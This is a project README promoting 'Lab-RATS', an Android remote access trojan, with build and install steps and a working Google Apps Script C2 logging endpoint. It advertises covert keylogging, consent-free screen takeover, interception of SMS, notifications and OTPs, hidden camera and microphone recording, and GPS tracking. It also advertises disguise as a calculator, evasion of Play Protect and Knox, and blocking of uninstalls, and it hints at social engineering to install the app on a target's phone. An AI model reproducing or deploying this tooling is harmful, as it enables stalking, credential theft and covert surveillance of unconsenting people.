<p align="center">
  <a href="https://postimg.cc/nC9DNBkn">
    <img src="https://i.postimg.cc/RVXL6TJJ/ic-launcher-playstore.png" alt="ic-launcher-playstore.png" />
  </a>
</p>

# Lab-RATS: Advanced Android Remote Administration Tool (v1.4.5)

**Lab-RATS** is a **powerful** and **lightweight Android Remote Administration Tool (RAT)** developed by **K4N3CO.LABS**. This advanced tool allows for **remote monitoring and management** of Android devices through a **sleek, web-based interface** designed for speed and reliability. Built for the modern era, it **fully supports the latest 2026 Android software releases** *(OneUI 8.5, SDK 36)*.

---

## 🛡️ Core Features & Security

-   📦 **Automated APK Generation**: Instantly build both `signed.apk` *(for production)* and `unsigned.apk`.
-   🆔 **Advanced Identity Control**: Fully customize **App Name**, **Package ID**, and **Minimum SDK**.
-   🔐 **C2 Security Layer**: The web dashboard is protected by a secure login wall (**Default Password: admin1337**). The password can be updated directly from the Terminal home page for enhanced security.
-   🎨 **Smart Branding Engine**:
    -   **Auto-Density Scaling**: Resizes logos automatically for all Android screen densities.
    -   **Transparency Fixer**: Removes white backgrounds from logo assets automatically.
-   📱 **PC/Mobile-Responsive**: The remote web interface is fully optimized for both PC and smartphone browsers, featuring a **touch-friendly layout, adaptive navigation tabs, and scalable UI elements** for monitoring from any device.

---

## 🕵️ Covert & Stealth Operations

-   🎭 **Stealth Mode**: Remotely **swap the entire app identity and icon** with the "Masquerade Library" of **convincing clones**. Instantly transform Lab-RATS into a **Calculator**, **Weather App**, **System Diagnostics**, or **Settings Menu**.
-   🛡️ **NEW!** **Evasion Engine**: Now **undetectable by Samsung Knox** and **Google Play Protect**. This is achieved through **dynamic code obfuscation** during the APK build process, **randomized package identities**, and the use of **fully interactive decoy activities** that mimic legitimate system behaviors to bypass heuristic and signature-based scanning.
-   🛠️ **Functional Decoy Engine**: Unlike static images, these decoys are **fully interactive**. The Calculator performs real math, and the Weather app dynamically loads the target's actual city name and forecast.
-   🩹 **Self-Healing Protocol**: Automatically detects and **repairs damaged service bindings** or **revoked permissions**;in the background.
-   ☎️ **Dial-Pad Recovery**: If the launcher icon is hidden or replaced, **dial `*#1337#` on the phone's keypad** to instantly restore the Lab-RATS dashboard.
-   🚪 **Hidden Backdoor**: Every decoy features a secret bypass. **Rapidly tapping the display or background icon 10 times** instantly unlocks the C2 server interface.
-   👻 **Task-List Ghosting**: The app is hard-coded to be **invisible in the Android "Recent Apps" list**.
-   📡 **Deep Rebranding**: When stealth is active, background notifications are automatically rebranded with matching icons and names to ensure zero branding leaks.
-   🎲 **Dynamic OTA Camouflage**: Generates **random version names and codes** that mimic legitimate system OTA updates.
-   🌑 **NEW!** **Blackout Mode**: A high-stealth mode designed to **physically mask the targets device display** while maintaining a **non-masked live remote feed**.

---

## 🚀 The Fun Stuff (Remote Capabilities)

-   👻 **Ghost Controller (Gold Standard)**:
    -   **Live Keylogging (v1.4 Update)**: Intercept **keystrokes and system text in real-time**. Now features **Sensitive Info Highlighting** *(Passcodes, OTPs, Emails glow Red)* and **Deep Extraction** for browser logins.
    -   **📱 Ghost Screen Control/Mirror**: Cast the **live screen** and **control** the **device remotely** with **NO "Consent Prompt"** required. *(Essentially full remote takeover, pair with Blackout Mode for max stealth)*
-   💀  **Anti-Removal Shield (Optimized)**: High-speed, event-driven protection that **blocks attempts** to **Uninstall or Force Stop** the app. *(Kicks user to homescreen & denies any entry to the app settings)*
-   🛰️  **Precision GPS Tracking**: One-click uplink to open the **target's exact real-time location** in **Google Maps**.
-   ⚡   **Intel Stream (Notification Sniffer)**: Intercept **every notification** (*WhatsApp, Telegram, RCS, System*) in a live feed. **NEW!**: Automatically highlights and badges **sensitive data like OTPs and Bank alerts**.
-   🖼️ **MMS Terminal (Game Changer!)**:
    -   **Browse & Extract**: Download and view **ANY Multimedia Message (MMS)**. **v1.4 Update**: Fixed large video playback and streaming support.
    -   **Remote Dispatch**: Send **MMS/Picture Messages** directly from the target phone.
-   💬 **SMS Command Center**: Full interception and remote texting from the target's number.
-   📸 **Tactical Surveillance Hub**:
    -   **Live Camera Streaming**: View **high-speed video** from **both front** and **back cameras**.
    -   **Covert Recording**: **Stealthily record** video without any user-facing activity.
    -   **Snap Photos**: **Covert image capture** integrated into live stream.
    -   **Nightmode**: **Brightens live stream/photos** taken in **low-light environments** without the flash.
-   🎙️ **Acoustics & Interception**: Live **microphone recording** and automated **call recording** for both incoming and outgoing calls.
-   📞 **Remote Dialer**: Initiate **phone calls directly from the C2 panel** using the target's SIM card.
-   📂 **Advanced Data Uplink**:
    -   **Integrated File Manager**: Navigate, download, and manage files. **NEW!**: Instant **Search Bar** and **Category Filters** (Images/Video/Docs) for PC-optimized workflows.
    -   **Info Gathering**: Access to **Call Logs**, **Contacts** and **Device Hardware Info**.
    -   **📝 Direct File Editor**: Live-edit **text, JSON**, and **log files** directly on the device.
-   📊 **Telemetry & Reporting**:
    -   **C2 Auto-Reporting**: Discrete reporting of **IP, Battery %, Network Type (WiFi/Cellular), and Stealth Status** to a centralized **Google Sheet**.

---

## 🧠 Remote Persistence & Commands

### 🌐 **Direct IPv6 Access (Direct P2P Backdoor)**

Lab-RATS exploits the unique traits of **publicly routable IPv6 addresses** assigned by modern WIFI/5G/LTE carriers. By binding the Lab-RATS server directly to the **Global Unicast Address**, it **bypasses Carrier-Grade NAT** *(CGNAT)* and **firewalls entirely**. This allows for **Zero Configuration** peer-to-peer *(P2P)* **remote access** from **any** browser in the world without the need for **routers, port forwarding,** or **external tunneling software**. *(Pinggy or Ngrok)*

### 🔄 **NEW!** **Remote Server Restart**

-   **Web UI**: One-click **"RESTART_SERVER"** button on the home terminal to refresh background services.
-    **SMS Backdoor**: Send an SMS containing **`!RESTART_C2`** to force the server back online **even if it was manually closed or killed by the OS.**

---

## 🛠️ Getting Started

### 1. Requirements:
*   **Java 11 or 21** installed on your **workstation**.
*   📱 A **target Android** device *(Samsung/Pixel/OnePlus supported)*.
*   A **Google Sheet Webhook URL** for IP tracking.

### 2. Build the APK: (on PC)
1.  **Download & Extract** the repository.
2.  Navigate to `cd /Lab-RATS-main/apk-builder/`
3.  **Execute** the builder: chmod +x build.sh && ./build.sh` (Mac/Linux) or `build.bat` (Windows).
4.  Enter your **App name** (Default: *System Stability Service*) and **Google Sheet URL**. *(Google Sheet setup instructions below)*
4.  Retrieve your `signed.apk` from the `/apk-builder/output/` directory.

### 3. Install APK onto Target Device
1.  **Install** the `signed.apk` onto the **Target Android device**.
> ** *If you have access to the device, turn on USB debugging (developer settings), plug into a PC and run `adb install signed.apk`. If not get creative on how to install Android `.apk` files onto devices.(Social Engineering?....etc)*

2.  Once the App is installed on **Target Device**, **ALL permissions must be granted to the App**, then tap the **"Initialize Server"** button.
3.  The **Server** will go online and the **Active interface Web IP Link** should **pop up instantly** on your **Google Sheet**. *(Example Google Sheet Below)*
4.  **Thats it**! Now you can use **ALL the remote features from anywhere in the world** as long as the **App Server is running on the Target device**.
> **Note** - *To use "Ghost features", navigate to the Ghost Tab on the Web C2 Panel and click "Open Accessibility Settings".*

![Accessibilities-Perm.png](https://i.postimg.cc/Z510fCkq/Accessibilities-Perm.png)

> *This opens the accessibility menu on the Target device, tap "Installed Apps".*

<a href="https://postimg.cc/PCzZSym1" target="_blank"><img src="https://i.postimg.cc/PCzZSym1/Accesibilty-menu.jpg" alt="Accesibilty-menu"></a>

> *Toggle permission on, then tap "Allow"  to permit full control of device.*

<a href="https://postimg.cc/3kCpt1gX" target="_blank"><img src="https://i.postimg.cc/3kCpt1gX/Accessibility-allow.jpg" alt="Accessibility-allow"></a>

> ** *This ONLY applies to the "Ghost Remote Control", "Ghost Utilities", and "Ghost Keylogs". ALL other features can be used without this permission.*

---

## 📊 Google Sheet C2 Setup Instructions (Advanced v1.4)

1.  **Create** a new **Google Sheet**.
2.  Go to **Extensions** → **Apps Script** and **paste this Hybrid Snippet:** *(Supports both GET and POST)*

```javascript
function doGet(e) {
  return handleRequest(e);
}

function doPost(e) {
  return handleRequest(e);
}

function handleRequest(e) {
  try {
    var ss = SpreadsheetApp.getActiveSpreadsheet();
    
    // Check if script is correctly bound to a sheet
    if (!ss) {
      return ContentService.createTextOutput("ERROR: Script not bound to a spreadsheet. Create it from WITHIN the Google Sheet (Extensions -> Apps Script)").setMimeType(ContentService.MimeType.TEXT);
    }

    var sheet = ss.getSheetByName("LabRATS Logs");
    if (!sheet) {
      sheet = ss.insertSheet("LabRATS Logs");
      sheet.appendRow(["Timestamp", "Device", "Network", "IP", "Port", "Link", "Battery", "Stealth Status"]);
    }
    
    var data = {};
    
    // Handle POST (JSON body)
    if (e.postData && e.postData.contents) {
      data = JSON.parse(e.postData.contents);
    } 
    // Handle GET (URL parameters)
    else if (e.parameter) {
      data = e.parameter;
    }

    var rowData = [
      new Date(),
      data.device || "Unknown",
      data.network || "Unknown",
      data.ip || "Unknown",
      data.port || "8080",
      data.link || "Unknown",
      data.battery || "Unknown",
      (data.stealth === true || data.stealth === "true") ? "ACTIVE" : "OFF"
    ];
    
    sheet.appendRow(rowData);
    return ContentService.createTextOutput("SUCCESS").setMimeType(ContentService.MimeType.TEXT);
  } catch (err) {
    return ContentService.createTextOutput("ERROR: " + err.message).setMimeType(ContentService.MimeType.TEXT);
  }
}
```
3.  **Deploy** → **New Deployment** → **Web App** → **Execute as Me** → **Who has access: Anyone**.
4.  **Important**: **Copy the Web App URL** and **paste it** into the **apk-builder** tool when prompted.

### 📊 Example Google Sheet Configured:

[![Google-Sheet-Example.png](https://i.postimg.cc/L6qYMSZr/Google-Sheet-Example.png)](https://postimg.cc/56VNwZg3)

---

## ⭐ Support the Development

If you find **Lab-RATS** awesome and useful for your **security research**, **please Star ⭐ the project**—it drives **further development!!**
### Contributions:
**Bug reports, add new feature** and **pull requests** are **always welcome**.

---

### Donations: (Optional)
**BuyMeACoffee**:

https://buymeacoffee.com/k4n3co


**BTC**:

```
bc1q6lmkuju3kf7f8624fwt5qs7k5mf63mekgcnzf4
```

---

## 📸 Screenshots/Video Clips

### Example APK build in terminal: (Mac OS) - Advanced v1.4
> *This build excludes my Google Sheet Webhook URL for security. For normal private builds, you must add your own Google webhook URL to correctly receive the IPv6 address link from the app after installation.*

https://github.com/user-attachments/assets/366df760-df71-455e-aae9-3acf3ef6ed26

---

### Built APK (C2 Server) Installed on Target Android Device:

<p align="center">
<a href="https://postimg.cc/zySrqv1Z" target="_blank"><img src="https://i.postimg.cc/zySrqv1Z/App-installed-Running.png" alt="App-installed-Running"></a>
<a href="https://postimg.cc/PLXkJHdS" target="_blank"><img src="https://i.postimg.cc/PLXkJHdS/App-installed-Offline.png" alt="App-installed-Offline"></a>

### App Bypassing ALL Android Security Measures While Operating:

https://github.com/user-attachments/assets/2b87c9c8-918e-42ec-81a8-19cd1673a7fc

---

### Remotely Transform Lab-RATS into a Working Calculator, Weather App, System Update, or Settings Menu:

<p align="center">
<a href="https://postimg.cc/hhrzqMBt" target="_blank"><img src="https://i.postimg.cc/hhrzqMBt/Stealth-Icons.jpg" alt="Stealth-Icons"></a>    

<p align="center">
<a href="https://postimg.cc/jnqpNR2N" target="_blank"><img src="https://i.postimg.cc/jnqpNR2N/Stealth-Overlays.jpg" alt="Stealth-Overlays"></a>

---

## Remote Web Control (C2) Panel - PC Interface

### Remote C2 Panel Video:

https://github.com/user-attachments/assets/5d8f33c7-f4a6-4df5-ab55-69e317ca7874

---

### Terminal/Homepage Tab:

[![01-Terminal-Tab.png](https://i.postimg.cc/jjwCKz5t/01-Terminal-Tab.png)](https://postimg.cc/McwzmfVF)

---

### Ghost Operations Tab: *(Top half)*

[![02-Ghost-Tab-Top-Half.png](https://i.postimg.cc/B6mmqm9X/02-Ghost-Tab-Top-Half.png)](https://postimg.cc/G8sFKJpC)

---

### Ghost Ops.Tab Remote/Stealth: *(Bottom half)*

<p align="center">
  <a href="https://postimg.cc/mzwH8XGJ">
    <img src="https://i.postimg.cc/4yCQ4q2f/03-Ghost-Tab-Bottom.png" alt="03-Ghost-Tab-Bottom.png" />
  </a>
</p>

---

### Optics/Live Camera Stream Tab:

[![04-Optics-Tab.png](https://i.postimg.cc/W3Z0ySpq/04-Optics-Tab.png)](https://postimg.cc/R6M367Hv)

---

### Live Camera Stream Example:

[![05-Live-Cam-Stream.png](https://i.postimg.cc/x8Dh4Skw/05-Live-Cam-Stream.png)](https://postimg.cc/phCsm4JC)

---

### Locate/Live GPS Tab:

[![06-Locate-Tab.png](https://i.postimg.cc/9MBQzqJM/06-Locate-Tab.png)](https://postimg.cc/tZYjM70Q)

---

### Data/Storage Tab:

[![6-Data-Tab.png](https://i.postimg.cc/W3qvx3sD/6-Data-Tab.png)](https://postimg.cc/bDPWtqD8)

---

### Intel/App Notifications Tab:

[![8-Intel-Tab.png](https://i.postimg.cc/sxFrzr2j/8-Intel-Tab.png)](https://postimg.cc/PpMcb0Z9)

---

### SMS/Text Message Tab:

[![9-SMS-Tab.png](https://i.postimg.cc/x8r2Q2dC/9-SMS-Tab.png)](https://postimg.cc/Q9qPgv1G)

---

### MMS/Multimedia Message Tab:

[![07-MMS-Tab.png](https://i.postimg.cc/YSKr3xP3/07-MMS-Tab.png)](https://postimg.cc/K1fhctxk)

---

### Acoustics/Audio Tab:

[![08-Acoustics-Tab.png](https://i.postimg.cc/kM17ZCH0/08-Acoustics-Tab.png)](https://postimg.cc/s1WFQksm)

---

### Call Logs Tab:

[![12-Call-Logs-Tab.png](https://i.postimg.cc/Sshdb1h6/12-Call-Logs-Tab.png)](https://postimg.cc/QBf1pbVC)

---

### Contacts Tab:

[![13-Contacts-Tab.png](https://i.postimg.cc/4dgPR2gz/13-Contacts-Tab.png)](https://postimg.cc/DWxLqgmZ)

---

### Hardware/Device Info Tab:

[![14-Hardware-Tab.png](https://i.postimg.cc/Cx2jHhLm/14-Hardware-Tab.png)](https://postimg.cc/75gGqyz2)

---

## 📱 Remote Web Control (C2) Panel - Mobile Interface *(A Few Examples)*

<p align="center">
<a href="https://postimg.cc/nXZxpmhT" target="_blank"><img src="https://i.postimg.cc/nXZxpmhT/Lab-RATS-Mobile-C2-Home.jpg" alt="Lab-RATS-Mobile-C2-Home"></a> <a href="https://postimg.cc/dhvFwCVB" target="_blank"><img src="https://i.postimg.cc/dhvFwCVB/Lab-Rats-Mobile-C2-Ghost1.jpg" alt="Lab-Rats-Mobile-C2-Ghost1"></a> <a href="https://postimg.cc/HrHmdMk9" target="_blank"><img src="https://i.postimg.cc/HrHmdMk9/Lab-RATS-Mobile-C2-Ghost2.jpg" alt="Lab-RATS-Mobile-C2-Ghost2"></a> <a href="https://postimg.cc/cvZW03Lk" target="_blank"><img src="https://i.postimg.cc/cvZW03Lk/Lab-RATS-Mobile-C2-Optics.jpg" alt="Lab-RATS-Mobile-C2-Optics"></a> <a href="https://postimg.cc/jDKTtfSZ" target="_blank"><img src="https://i.postimg.cc/jDKTtfSZ/Lab-RATS-Mobile-C2-GPS.jpg" alt="Lab-RATS-Mobile-C2-GPS"></a>

---

## ⚠️ Disclaimer
This tool is for **educational and authorized testing purposes.** The **developers** assume **NO responsibility** for **ANY** **misuse or damage to relationships** caused by this software. **Please use it responsibly**. **Thank you!**

---

© 2026 **K4N3CO.LABS**
